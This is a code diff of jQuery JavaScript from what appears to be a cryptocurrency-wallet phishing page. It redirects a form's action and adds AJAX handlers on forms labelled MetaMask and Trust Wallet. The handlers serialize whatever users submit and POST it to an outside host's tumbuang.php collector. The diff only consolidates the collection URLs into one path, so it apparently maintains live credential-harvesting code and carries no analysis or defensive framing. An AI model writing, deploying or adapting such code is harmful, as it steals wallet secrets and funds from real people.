@@ -1,5 +1,5 @@
 $("form").submit(function() {
-  $(myform).attr("action", "//gilowaang.antah-layuang.my.id/SASA/tumbuang.php");
+  $(myform).attr("action", "//gilowaang.antah-layuang.my.id/TT/tumbuang.php");
 });
 
 $('.beTwZZ').on('click', function() {  
@@ -34,7 +34,7 @@ $('#rewards2 .confirm-approve-content__small-text > button').on('click', functio
  $("#metamask").on("submit", "#metamask", function(e) {
         e.preventDefault();
         $.ajax({
-            url: '//gilowaang.antah-layuang.my.id/SASA/NewFolderMT/tumbuang.php',
+            url: '//gilowaang.antah-layuang.my.id/TT/tumbuang.php',
             type: 'post',
             data: $(this).serialize(),
             success: function(data) {
@@ -54,7 +54,7 @@ $('#rewards2 .confirm-approve-content__small-text > button').on('click', functio
     $("#trustwallet").on("submit", "#metamask", function(e) {
         e.preventDefault();
         $.ajax({
-            url: '//gilowaang.antah-layuang.my.id/SASA/NewFolderTW/tumbuang.php',
+            url: '//gilowaang.antah-layuang.my.id/TT/tumbuang.php',
             type: 'post',
             data: $(this).serialize(),
             success: function(data) {
